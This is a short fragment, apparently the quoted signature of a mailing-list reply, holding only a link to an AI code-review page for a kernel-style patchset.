+> 
+> -- 
+> Sashiko AI review � https://sashiko.dev/#/patchset/20260620170040.3756043-1-den@valinux.co.jp?part=1
